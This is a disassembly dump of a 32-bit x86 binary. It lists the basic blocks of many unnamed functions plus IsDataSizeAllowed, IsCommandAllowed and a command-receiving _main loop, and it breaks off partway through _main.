FUNCTION NAME:sub_804c19b
TOTAL BLOCKS :10
0x804c1a8:	add	esp, 0x10
0x804c1ab:	test	eax, eax
0x804c1ad:	mov	esi, eax
0x804c1af:	je	0x804cc8c
None
|
|
|
v
0x804c1e2:	add	esp, 0x14
0x804c1e5:	push	esi
0x804c1e6:	call	0x804f35a
None
|
|
|
v
0x804c21d:	add	esp, 0x14
0x804c220:	push	edi
0x804c221:	call	0x8051de0
None
|
|
|
v
0x804c226:	mov	byte ptr [esi + 0x2008], 0xe
0x804c22d:	mov	byte ptr [esi + 0x2009], 0xf
0x804c234:	mov	byte ptr [esi + 0x200a], 0x10
0x804c23b:	mov	dword ptr [esi + 0x2004], 1
0x804c245:	mov	byte ptr [esi + 0x2020], al
0x804c24b:	jmp	0x804c3f1
None
|
|
|
v
0x804c19b:	sub	esp, 0xc
0x804c19e:	push	0x2024
0x804c1a3:	call	0x804bd40
None
|
|
|
v
0x804c1eb:	mov	dword ptr [esi + 0x2010], eax
0x804c1f1:	mov	dword ptr [esi + 0x2014], edx
0x804c1f7:	mov	dword ptr [esp], edi
0x804c1fa:	call	0x8051e32
None
|
|
|
v
0x804c3f1:	mov	eax, dword ptr [esp + 0x2840]
0x804c3f8:	mov	dword ptr [esi + 0x200c], eax
0x804c3fe:	pop	eax
0x804c3ff:	pop	edx
0x804c400:	push	esi
0x804c401:	push	0x8053167
0x804c406:	jmp	0x804cc84
None
|
|
|
v
0x804c1ff:	mov	dword ptr [esi + 0x201c], edx
0x804c205:	mov	dword ptr [esi + 0x2018], eax
0x804c20b:	mov	dword ptr [esp], 0x800
0x804c212:	push	edi
0x804c213:	push	3
0x804c215:	push	7
0x804c217:	push	ebx
0x804c218:	call	0x80521a4
None
|
|
|
v
0x804c1c8:	add	esp, 0x14
0x804c1cb:	push	0x800
0x804c1d0:	lea	edi, dword ptr [esp + 0x2010]
0x804c1d7:	push	edi
0x804c1d8:	push	2
0x804c1da:	push	7
0x804c1dc:	push	ebx
0x804c1dd:	call	0x80521a4
None
|
|
|
v
0x804c1b5:	sub	esp, 0xc
0x804c1b8:	push	0x1000
0x804c1bd:	push	eax
0x804c1be:	push	1
0x804c1c0:	push	7
0x804c1c2:	push	ebx
0x804c1c3:	call	0x80521a4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c270
TOTAL BLOCKS :3
0x804c270:	sub	esp, 0xc
0x804c273:	push	ebx
0x804c274:	call	0x8051de0
None
|
|
|
v
0x804c281:	jmp	0x804cc89
None
|
|
|
v
0x804c279:	mov	dword ptr [esp], eax
0x804c27c:	call	0x8050873
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c286
TOTAL BLOCKS :3
0x804c286:	sub	esp, 0xc
0x804c289:	push	ebx
0x804c28a:	call	0x8051de0
None
|
|
|
v
0x804c297:	jmp	0x804cc89
None
|
|
|
v
0x804c28f:	mov	dword ptr [esp], eax
0x804c292:	call	0x80507af
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c305
TOTAL BLOCKS :2
0x804c314:	jmp	0x804cc89
None
|
|
|
v
0x804c305:	sub	esp, 0xc
0x804c308:	push	dword ptr [esp + 0x283c]
0x804c30f:	call	0x80557c5
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c323
TOTAL BLOCKS :11
0x804c369:	add	esp, 0x14
0x804c36c:	push	0x800
0x804c371:	lea	edi, dword ptr [esp + 0x2010]
0x804c378:	push	edi
0x804c379:	push	3
0x804c37b:	push	7
0x804c37d:	push	ebx
0x804c37e:	call	0x80521a4
None
|
|
|
v
0x804c3d1:	add	esp, 0x14
0x804c3d4:	push	edi
0x804c3d5:	call	0x8051de0
None
|
|
|
v
0x804c33d:	sub	esp, 0xc
0x804c340:	push	0x1000
0x804c345:	push	eax
0x804c346:	push	1
0x804c348:	push	7
0x804c34a:	push	ebx
0x804c34b:	call	0x80521a4
None
|
|
|
v
0x804c323:	sub	esp, 0xc
0x804c326:	push	0x2024
0x804c32b:	call	0x804bd40
None
|
|
|
v
0x804c383:	add	esp, 0x14
0x804c386:	push	edi
0x804c387:	call	0x8051e32
None
|
|
|
v
0x804c3da:	mov	dword ptr [esi + 0x2004], 0
0x804c3e4:	mov	byte ptr [esi + 0x2008], 0x11
0x804c3eb:	mov	byte ptr [esi + 0x2020], al
0x804c3f1:	mov	eax, dword ptr [esp + 0x2840]
0x804c3f8:	mov	dword ptr [esi + 0x200c], eax
0x804c3fe:	pop	eax
0x804c3ff:	pop	edx
0x804c400:	push	esi
0x804c401:	push	0x8053167
0x804c406:	jmp	0x804cc84
None
|
|
|
v
0x804c38c:	mov	dword ptr [esi + 0x2014], edx
0x804c392:	mov	dword ptr [esi + 0x2010], eax
0x804c398:	mov	dword ptr [esp], 0x800
0x804c39f:	push	edi
0x804c3a0:	push	4
0x804c3a2:	push	7
0x804c3a4:	push	ebx
0x804c3a5:	call	0x80521a4
None
|
|
|
v
0x804c3b3:	mov	dword ptr [esi + 0x201c], edx
0x804c3b9:	mov	dword ptr [esi + 0x2018], eax
0x804c3bf:	mov	dword ptr [esp], 0x800
0x804c3c6:	push	edi
0x804c3c7:	push	5
0x804c3c9:	push	7
0x804c3cb:	push	ebx
0x804c3cc:	call	0x80521a4
None
|
|
|
v
0x804c350:	add	esp, 0x14
0x804c353:	push	0x1000
0x804c358:	lea	eax, dword ptr [esi + 0x1000]
0x804c35e:	push	eax
0x804c35f:	push	2
0x804c361:	push	7
0x804c363:	push	ebx
0x804c364:	call	0x80521a4
None
|
|
|
v
0x804c330:	add	esp, 0x10
0x804c333:	test	eax, eax
0x804c335:	mov	esi, eax
0x804c337:	je	0x804cc8c
None
|
|
|
v
0x804c3aa:	add	esp, 0x14
0x804c3ad:	push	edi
0x804c3ae:	call	0x8051e32
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c41f
TOTAL BLOCKS :3
0x804c428:	movzx	eax, al
0x804c42b:	mov	dword ptr [esp], eax
0x804c42e:	call	0x80530f6
None
|
|
|
v
0x804c433:	jmp	0x804cc89
None
|
|
|
v
0x804c41f:	sub	esp, 0xc
0x804c422:	push	ebx
0x804c423:	call	0x8051de0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c438
TOTAL BLOCKS :6
0x804c47e:	add	esp, 0x18
0x804c481:	mov	byte ptr [esi + 0x2200], 1
0x804c488:	push	esi
0x804c489:	push	0x804f172
0x804c48e:	jmp	0x804cc84
None
|
|
|
v
0x804cc84:	call	0x804f559
None
|
|
|
v
0x804c445:	add	esp, 0x10
0x804c448:	test	eax, eax
0x804c44a:	mov	esi, eax
0x804c44c:	je	0x804cc8c
None
|
|
|
v
0x804c465:	add	esp, 0x14
0x804c468:	push	0x1100
0x804c46d:	lea	eax, dword ptr [esi + 0x1100]
0x804c473:	push	eax
0x804c474:	push	2
0x804c476:	push	7
0x804c478:	push	ebx
0x804c479:	call	0x80521a4
None
|
|
|
v
0x804c452:	sub	esp, 0xc
0x804c455:	push	0x1100
0x804c45a:	push	eax
0x804c45b:	push	1
0x804c45d:	push	7
0x804c45f:	push	ebx
0x804c460:	call	0x80521a4
None
|
|
|
v
0x804c438:	sub	esp, 0xc
0x804c43b:	push	0x2201
0x804c440:	call	0x804bd40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c493
TOTAL BLOCKS :6
0x804c4ad:	add	esp, 0x14
0x804c4b0:	push	0x1000
0x804c4b5:	lea	edi, dword ptr [esp + 0x10]
0x804c4b9:	push	edi
0x804c4ba:	push	2
0x804c4bc:	push	7
0x804c4be:	push	ebx
0x804c4bf:	call	0x80521a4
None
|
|
|
v
0x804c493:	sub	esp, 0xc
0x804c496:	push	0x800
0x804c49b:	lea	esi, dword ptr [esp + 0x2010]
0x804c4a2:	push	esi
0x804c4a3:	push	1
0x804c4a5:	push	7
0x804c4a7:	push	ebx
0x804c4a8:	call	0x80521a4
None
|
|
|
v
0x804c4f2:	jmp	0x804cc89
None
|
|
|
v
0x804c4c4:	add	esp, 0x14
0x804c4c7:	push	0x1000
0x804c4cc:	lea	ebp, dword ptr [esp + 0x1010]
0x804c4d3:	push	ebp
0x804c4d4:	push	3
0x804c4d6:	push	7
0x804c4d8:	push	ebx
0x804c4d9:	call	0x80521a4
None
|
|
|
v
0x804c4e7:	add	esp, 0xc
0x804c4ea:	push	eax
0x804c4eb:	push	edi
0x804c4ec:	push	esi
0x804c4ed:	call	0x804f0a6
None
|
|
|
v
0x804c4de:	add	esp, 0x14
0x804c4e1:	push	ebp
0x804c4e2:	call	0x8051de0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c4f7
TOTAL BLOCKS :4
0x804c511:	add	esp, 0x14
0x804c514:	push	0x1000
0x804c519:	lea	edi, dword ptr [esp + 0x1010]
0x804c520:	push	edi
0x804c521:	push	2
0x804c523:	push	7
0x804c525:	push	ebx
0x804c526:	call	0x80521a4
None
|
|
|
v
0x804c52b:	add	esp, 0x18
0x804c52e:	push	edi
0x804c52f:	push	esi
0x804c530:	call	0x804f111
None
|
|
|
v
0x804c535:	jmp	0x804cc89
None
|
|
|
v
0x804c4f7:	sub	esp, 0xc
0x804c4fa:	push	0x800
0x804c4ff:	lea	esi, dword ptr [esp + 0x2010]
0x804c506:	push	esi
0x804c507:	push	1
0x804c509:	push	7
0x804c50b:	push	ebx
0x804c50c:	call	0x80521a4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c53a
TOTAL BLOCKS :2
0x804c53a:	sub	esp, 0xc
0x804c53d:	push	ebx
0x804c53e:	call	0x804f0fc
None
|
|
|
v
0x804c543:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c548
TOTAL BLOCKS :2
0x804c548:	sub	esp, 0xc
0x804c54b:	push	ebx
0x804c54c:	call	0x804f385
None
|
|
|
v
0x804c551:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c556
TOTAL BLOCKS :6
0x804c59c:	mov	eax, dword ptr [esp + 0x2850]
0x804c5a3:	add	esp, 0x18
0x804c5a6:	mov	dword ptr [esi + 0x2100], 0
0x804c5b0:	mov	dword ptr [esi + 0x2104], eax
0x804c5b6:	push	esi
0x804c5b7:	push	0x804ee2e
0x804c5bc:	call	0x804f559
None
|
|
|
v
0x804c583:	add	esp, 0x14
0x804c586:	push	0x1000
0x804c58b:	lea	eax, dword ptr [esi + 0x1100]
0x804c591:	push	eax
0x804c592:	push	2
0x804c594:	push	7
0x804c596:	push	ebx
0x804c597:	call	0x80521a4
None
|
|
|
v
0x804c556:	sub	esp, 0xc
0x804c559:	push	0x2108
0x804c55e:	call	0x804bd40
None
|
|
|
v
0x804c563:	add	esp, 0x10
0x804c566:	test	eax, eax
0x804c568:	mov	esi, eax
0x804c56a:	je	0x804cc8c
None
|
|
|
v
0x804c5c1:	mov	dword ptr [0x805b9f0], eax
0x804c5c6:	jmp	0x804cc89
None
|
|
|
v
0x804c570:	sub	esp, 0xc
0x804c573:	push	0x1100
0x804c578:	push	eax
0x804c579:	push	1
0x804c57b:	push	7
0x804c57d:	push	ebx
0x804c57e:	call	0x80521a4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c5e0
TOTAL BLOCKS :3
0x804c5f0:	pop	esi
0x804c5f1:	pop	edi
0x804c5f2:	push	dword ptr [esp + 0x2838]
0x804c5f9:	push	0x804fdc8
0x804c5fe:	call	0x804f559
None
|
|
|
v
0x804c5e0:	sub	esp, 0xc
0x804c5e3:	lea	eax, dword ptr [esp + 0x280c]
0x804c5ea:	push	eax
0x804c5eb:	call	0x80558b7
None
|
|
|
v
0x804c603:	mov	dword ptr [0x805b9f8], eax
0x804c608:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c638
TOTAL BLOCKS :2
0x804c638:	sub	esp, 0xc
0x804c63b:	push	ebx
0x804c63c:	call	0x805038c
None
|
|
|
v
0x804c641:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c646
TOTAL BLOCKS :2
0x804c646:	sub	esp, 0xc
0x804c649:	push	dword ptr [esp + 0x283c]
0x804c650:	call	0x80524d9
None
|
|
|
v
0x804c655:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c65a
TOTAL BLOCKS :2
0x804c65a:	sub	esp, 0xc
0x804c65d:	push	dword ptr [esp + 0x283c]
0x804c664:	call	0x8055d20
None
|
|
|
v
0x804c669:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c66e
TOTAL BLOCKS :2
0x804c66e:	sub	esp, 0xc
0x804c671:	push	dword ptr [esp + 0x283c]
0x804c678:	call	0x804fa08
None
|
|
|
v
0x804c67d:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c682
TOTAL BLOCKS :2
0x804c682:	sub	esp, 0xc
0x804c685:	push	ebx
0x804c686:	call	0x804fda3
None
|
|
|
v
0x804c68b:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c690
TOTAL BLOCKS :2
0x804c69f:	jmp	0x804cc89
None
|
|
|
v
0x804c690:	sub	esp, 0xc
0x804c693:	push	dword ptr [esp + 0x283c]
0x804c69a:	call	0x805377b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c6a4
TOTAL BLOCKS :2
0x804c6a4:	sub	esp, 0xc
0x804c6a7:	push	ebx
0x804c6a8:	call	0x80539bb
None
|
|
|
v
0x804c6ad:	jmp	0x804cc89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c6b2
TOTAL BLOCKS :15
0x804c755:	test	eax, eax
0x804c757:	mov	eax, dword ptr [esp + 0x2840]
0x804c75e:	setne	byte ptr [esi + 0x3300]
0x804c765:	mov	dword ptr [esi + 0x330c], eax
0x804c76b:	mov	dword ptr [esp], ebp
0x804c76e:	call	0x80526cc
None
|
|
|
v
0x804c6b2:	sub	esp, 0xc
0x804c6b5:	push	0x3310
0x804c6ba:	call	0x804bd40
None
|
|
|
v
0x804c792:	pop	ecx
0x804c793:	lea	eax, dword ptr [esp + 0x280c]
0x804c79a:	push	eax
0x804c79b:	call	0x804f57c
None
|
|
|
v
0x804c734:	mov	dword ptr [esi + 0x3304], eax
0x804c73a:	mov	dword ptr [esp], 0x800
0x804c741:	push	edi
0x804c742:	push	5
0x804c744:	push	7
0x804c746:	push	ebx
0x804c747:	call	0x80521a4
None
|
|
|
v
0x804c72b:	add	esp, 0x14
0x804c72e:	push	edi
0x804c72f:	call	0x8051de0
None
|
|
|
v
0x804c773:	mov	dword ptr [esp + 0x2810], eax
0x804c77a:	add	esp, 0x10
0x804c77d:	test	eax, eax
0x804c77f:	je	0x804c886
None
|
|
|
v
0x804c6cc:	sub	esp, 0xc
0x804c6cf:	push	0x1100
0x804c6d4:	push	eax
0x804c6d5:	push	1
0x804c6d7:	push	7
0x804c6d9:	push	ebx
0x804c6da:	call	0x80521a4
None
|
|
|
v
0x804c785:	push	edx
0x804c786:	push	0x1100
0x804c78b:	push	eax
0x804c78c:	push	ebp
0x804c78d:	call	0x8051ce0
None
|
|
|
v
0x804c6f8:	add	esp, 0x14
0x804c6fb:	push	0x1100
0x804c700:	lea	ebp, dword ptr [esi + 0x2200]
0x804c706:	push	ebp
0x804c707:	push	3
0x804c709:	push	7
0x804c70b:	push	ebx
0x804c70c:	call	0x80521a4
None
|
|
|
v
0x804c6bf:	add	esp, 0x10
0x804c6c2:	test	eax, eax
0x804c6c4:	mov	esi, eax
0x804c6c6:	je	0x804cc8c
None
|
|
|
v
0x804c886:	push	edi
0x804c887:	push	edi
0x804c888:	push	esi
0x804c889:	push	0x804f727
0x804c88e:	jmp	0x804cc84
None
|
|
|
v
0x804c6df:	add	esp, 0x14
0x804c6e2:	push	0x1100
0x804c6e7:	lea	eax, dword ptr [esi + 0x1100]
0x804c6ed:	push	eax
0x804c6ee:	push	2
0x804c6f0:	push	7
0x804c6f2:	push	ebx
0x804c6f3:	call	0x80521a4
None
|
|
|
v
0x804c711:	add	esp, 0x14
0x804c714:	push	0x800
0x804c719:	lea	edi, dword ptr [esp + 0x2010]
0x804c720:	push	edi
0x804c721:	push	4
0x804c723:	push	7
0x804c725:	push	ebx
0x804c726:	call	0x80521a4
None
|
|
|
v
0x804c7a0:	add	esp, 0x10
0x804c7a3:	jmp	0x804c886
None
|
|
|
v
0x804c74c:	add	esp, 0x14
0x804c74f:	push	edi
0x804c750:	call	0x8051de0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c7a8
TOTAL BLOCKS :11
0x804c7d5:	add	esp, 0x14
0x804c7d8:	push	0x1100
0x804c7dd:	lea	eax, dword ptr [esi + 0x1100]
0x804c7e3:	push	eax
0x804c7e4:	push	2
0x804c7e6:	push	7
0x804c7e8:	push	ebx
0x804c7e9:	call	0x80521a4
None
|
|
|
v
0x804c7c2:	sub	esp, 0xc
0x804c7c5:	push	0x1100
0x804c7ca:	push	eax
0x804c7cb:	push	1
0x804c7cd:	push	7
0x804c7cf:	push	ebx
0x804c7d0:	call	0x80521a4
None
|
|
|
v
0x804c829:	add	esp, 0x18
0x804c82c:	push	edi
0x804c82d:	push	0x8055e9d
0x804c832:	push	0x1100
0x804c837:	push	1
0x804c839:	push	0x1100
0x804c83e:	lea	eax, dword ptr [esi + 0x2200]
0x804c844:	push	eax
0x804c845:	call	0x804bb70
None
|
|
|
v
0x804c85d:	add	esp, 0x14
0x804c860:	push	edi
0x804c861:	call	0x8051de0
None
|
|
|
v
0x804c84a:	add	esp, 0x14
0x804c84d:	push	0x800
0x804c852:	push	edi
0x804c853:	push	5
0x804c855:	push	7
0x804c857:	push	ebx
0x804c858:	call	0x80521a4
None
|
|
|
v
0x804c808:	add	esp, 0x14
0x804c80b:	push	edi
0x804c80c:	call	0x8051de0
None
|
|
|
v
0x804c811:	mov	dword ptr [esi + 0x3304], eax
0x804c817:	mov	dword ptr [esp], 0x800
0x804c81e:	push	edi
0x804c81f:	push	4
0x804c821:	push	7
0x804c823:	push	ebx
0x804c824:	call	0x80521a4
None
|
|
|
v
0x804c7ee:	add	esp, 0x14
0x804c7f1:	push	0x800
0x804c7f6:	lea	edi, dword ptr [esp + 0x2010]
0x804c7fd:	push	edi
0x804c7fe:	push	3
0x804c800:	push	7
0x804c802:	push	ebx
0x804c803:	call	0x80521a4
None
|
|
|
v
0x804c866:	add	esp, 0x10
0x804c869:	mov	dword ptr [esi + 0x330c], 0
0x804c873:	mov	dword ptr [esi + 0x3308], 0
0x804c87d:	test	eax, eax
0x804c87f:	setne	byte ptr [esi + 0x3300]
0x804c886:	push	edi
0x804c887:	push	edi
0x804c888:	push	esi
0x804c889:	push	0x804f727
0x804c88e:	jmp	0x804cc84
None
|
|
|
v
0x804c7a8:	sub	esp, 0xc
0x804c7ab:	push	0x3310
0x804c7b0:	call	0x804bd40
None
|
|
|
v
0x804c7b5:	add	esp, 0x10
0x804c7b8:	test	eax, eax
0x804c7ba:	mov	esi, eax
0x804c7bc:	je	0x804cc8c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c8d8
TOTAL BLOCKS :2
0x804c91a:	call	0x8050eda
None
|
|
|
v
0x804c8d8:	sub	esp, 0xc
0x804c8db:	push	1
0x804c8dd:	jmp	0x804c91a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c8f6
TOTAL BLOCKS :2
0x804c906:	mov	dword ptr [esp + 0x2810], eax
0x804c90d:	add	esp, 0x10
0x804c910:	jmp	0x804ca87
None
|
|
|
v
0x804c8f6:	sub	esp, 0xc
0x804c8f9:	lea	eax, dword ptr [esp + 0x2814]
0x804c900:	push	eax
0x804c901:	call	0x8051509
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c915
TOTAL BLOCKS :10
0x804c93a:	not	ecx
0x804c93c:	dec	ecx
0x804c93d:	mov	dword ptr [esp + 0x2808], ecx
0x804c944:	jmp	0x804ca87
None
|
|
|
v
0x804ca87:	mov	eax, dword ptr [esp + 0x2800]
0x804ca8e:	test	eax, eax
0x804ca90:	je	0x804cb3e
None
|
|
|
v
0x804cb33:	push	eax
0x804cb34:	call	0x804f57c
None
|
|
|
v
0x804ca96:	push	dword ptr [esp + 0x2808]
0x804ca9d:	and	esi, 0xff
0x804caa3:	push	eax
0x804caa4:	push	esi
0x804caa5:	push	dword ptr [esp + 0x283c]
0x804caac:	call	0x804e62a
None
|
|
|
v
0x804c933:	xor	eax, eax
0x804c935:	or	ecx, 0xffffffff
0x804c938:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804cab1:	pop	ebx
0x804cab2:	lea	eax, dword ptr [esp + 0x280c]
0x804cab9:	jmp	0x804cb33
None
|
|
|
v
0x804c915:	sub	esp, 0xc
0x804c918:	push	6
0x804c91a:	call	0x8050eda
None
|
|
|
v
0x804c938:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804c91f:	mov	dword ptr [esp + 0x2810], eax
0x804c926:	mov	edi, eax
0x804c928:	add	esp, 0x10
0x804c92b:	test	edi, edi
0x804c92d:	je	0x804ca87
None
|
|
|
v
0x804cb3e:	push	0
0x804cb40:	and	esi, 0xff
0x804cb46:	push	0
0x804cb48:	push	esi
0x804cb49:	jmp	0x804c142
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804cb53
TOTAL BLOCKS :3
0x804cb53:	sub	esp, 0xc
0x804cb56:	lea	eax, dword ptr [esp + 0x283c]
0x804cb5d:	push	eax
0x804cb5e:	call	0x804e827
None
|
|
|
v
0x804cb6f:	jmp	0x804cc89
None
|
|
|
v
0x804cb63:	mov	dword ptr [esp], 0x7d0
0x804cb6a:	call	0x804f548
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804cb7e
TOTAL BLOCKS :3
0x804cb93:	mov	dword ptr [esp], 0
0x804cb9a:	call	0x804bd80
None
|
|
|
v
0x804cb7e:	sub	esp, 0xc
0x804cb81:	lea	eax, dword ptr [esp + 0x283c]
0x804cb88:	push	eax
0x804cb89:	call	0x804e827
None
|
|
|
v
0x804cb8e:	call	0x805297b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804cb9f
TOTAL BLOCKS :9
0x804cc20:	add	esp, 0x18
0x804cc23:	push	edi
0x804cc24:	push	0x8055e9d
0x804cc29:	push	0x1100
0x804cc2e:	push	1
0x804cc30:	push	0x1100
0x804cc35:	lea	eax, dword ptr [esi + 0x2200]
0x804cc3b:	push	eax
0x804cc3c:	call	0x804bb70
None
|
|
|
v
0x804cc08:	mov	dword ptr [esi + 0x3304], eax
0x804cc0e:	mov	dword ptr [esp], 0x800
0x804cc15:	push	edi
0x804cc16:	push	4
0x804cc18:	push	7
0x804cc1a:	push	ebx
0x804cc1b:	call	0x80521a4
None
|
|
|
v
0x804cbff:	add	esp, 0x14
0x804cc02:	push	edi
0x804cc03:	call	0x8051de0
None
|
|
|
v
0x804cbac:	add	esp, 0x10
0x804cbaf:	test	eax, eax
0x804cbb1:	mov	esi, eax
0x804cbb3:	je	0x804cc8c
None
|
|
|
v
0x804cbb9:	sub	esp, 0xc
0x804cbbc:	push	0x1100
0x804cbc1:	push	eax
0x804cbc2:	push	1
0x804cbc4:	push	7
0x804cbc6:	push	ebx
0x804cbc7:	call	0x80521a4
None
|
|
|
v
0x804cbcc:	add	esp, 0x14
0x804cbcf:	push	0x1100
0x804cbd4:	lea	eax, dword ptr [esi + 0x1100]
0x804cbda:	push	eax
0x804cbdb:	push	2
0x804cbdd:	push	7
0x804cbdf:	push	ebx
0x804cbe0:	call	0x80521a4
None
|
|
|
v
0x804cb9f:	sub	esp, 0xc
0x804cba2:	push	0x3310
0x804cba7:	call	0x804bd40
None
|
|
|
v
0x804cbe5:	add	esp, 0x14
0x804cbe8:	push	0x800
0x804cbed:	lea	edi, dword ptr [esp + 0x2010]
0x804cbf4:	push	edi
0x804cbf5:	push	3
0x804cbf7:	push	7
0x804cbf9:	push	ebx
0x804cbfa:	call	0x80521a4
None
|
|
|
v
0x804cc41:	add	esp, 0x18
0x804cc44:	mov	dword ptr [esi + 0x330c], 0
0x804cc4e:	mov	dword ptr [esi + 0x3308], 0
0x804cc58:	push	esi
0x804cc59:	push	0x8052688
0x804cc5e:	jmp	0x804cc84
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804cc60
TOTAL BLOCKS :3
0x804cc6a:	add	esp, 0x10
0x804cc6d:	test	eax, eax
0x804cc6f:	je	0x804cc8c
None
|
|
|
v
0x804cc71:	mov	edx, dword ptr [ebx]
0x804cc73:	mov	dword ptr [eax + 4], edx
0x804cc76:	mov	edx, dword ptr [ebx + 4]
0x804cc79:	mov	dword ptr [eax + 8], edx
0x804cc7c:	push	edx
0x804cc7d:	push	edx
0x804cc7e:	push	eax
0x804cc7f:	push	0x8053df0
0x804cc84:	call	0x804f559
None
|
|
|
v
0x804cc60:	sub	esp, 0xc
0x804cc63:	push	0xc
0x804cc65:	call	0x804bd40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsDataSizeAllowed
TOTAL BLOCKS :5
0x804ccb6:	cmp	edx, 0x41
0x804ccb9:	sete	al
0x804ccbc:	ret	
None
|
|
|
v
0x804ccac:	cmp	edx, 0xc02
0x804ccb2:	setle	al
0x804ccb5:	ret	
None
|
|
|
v
0x804cca1:	mov	eax, dword ptr [0x8058724]
0x804cca6:	cmp	dword ptr [esp + 4], eax
0x804ccaa:	jne	0x804ccb6
None
|
|
|
v
0x804ccbc:	ret	
None
|
|
|
v
0x804cc97:	mov	edx, dword ptr [esp + 8]
0x804cc9b:	xor	eax, eax
0x804cc9d:	test	edx, edx
0x804cc9f:	jle	0x804ccbc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsCommandAllowed
TOTAL BLOCKS :3
0x804cccd:	dec	eax
0x804ccce:	cmp	al, 0x3d
0x804ccd0:	setbe	al
0x804ccd3:	ret	
None
|
|
|
v
0x804ccd4:	cmp	al, 5
0x804ccd6:	sete	al
0x804ccd9:	ret	
None
|
|
|
v
0x804ccbd:	mov	edx, dword ptr [0x8058724]
0x804ccc3:	cmp	dword ptr [esp + 4], edx
0x804ccc7:	mov	al, byte ptr [esp + 8]
0x804cccb:	jne	0x804ccd4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_main
TOTAL BLOCKS :30
0x804cd9a:	pop	eax
0x804cd9b:	lea	eax, dword ptr [esp + 0xc18]
0x804cda2:	push	eax
0x804cda3:	call	0x804e827
None
|
|
|
v
0x804cd8d:	sub	esp, 0xc
0x804cd90:	push	0x2710
0x804cd95:	call	0x804f548
None
|
|
|
v
0x804cdd8:	call	0x804ea8c
None
|
|
|
v
0x804ccf2:	call	0x8052ec8
None
|
|
|
v
0x804cded:	add	esp, 0x10
0x804cdf0:	test	al, al
0x804cdf2:	jne	0x804ce04
None
|
|
|
v
0x804cddd:	mov	dword ptr [esp + 0xc0c], eax
0x804cde4:	sub	esp, 0xc
0x804cde7:	push	ebx
0x804cde8:	call	0x8054aa3
None
|
|
|
v
0x804cdf4:	sub	esp, 0xc
0x804cdf7:	push	0x2710
0x804cdfc:	call	0x804f548
None
|
|
|
v
0x804cdb8:	add	esp, 0x10
0x804cdbb:	jmp	0x804cd07
None
|
|
|
v
0x804cd53:	push	eax
0x804cd54:	push	esi
0x804cd55:	push	ebp
0x804cd56:	push	ebx
0x804cd57:	call	0x804eba2
None
|
|
|
v
0x804cdd0:	call	0x804bff0
None
|
|
|
v
0x804ce0e:	jmp	0x804cd07
None
|
|
|
v
0x804cd29:	add	esp, 0x10
0x804cd2c:	cmp	eax, 4
0x804cd2f:	jne	0x804cdc0
None
|
|
|
v
0x804ce01:	add	esp, 0x10
0x804ce04:	cmp	dword ptr [esp + 0xc0c], -1
0x804ce0c:	je	0x804cdd8
None
|
|
|
v
0x804ccfc:	mov	dword ptr [esp + 0xc0c], 0xffffffff
0x804cd07:	mov	dword ptr [esp + 0xc08], 0
0x804cd12:	push	eax
0x804cd13:	push	4
0x804cd15:	lea	eax, dword ptr [esp + 0xc10]
0x804cd1c:	push	eax
0x804cd1d:	push	dword ptr [esp + 0xc18]
0x804cd24:	call	0x804eba2
None
|
|
|
v
0x804cd4c:	add	esp, 0x10
0x804cd4f:	test	al, al
0x804cd51:	je	0x804cd07
None
|
|
|
v
0x804ce04:	cmp	dword ptr [esp + 0xc0c], -1
0x804ce0c:	je	0x804cdd8
None
|
|
|
v
0x804ccf7:	call	0x8052a58
None
|
|
|
v
0x804cd6c:	mov	byte ptr [esp + eax + 6], 0
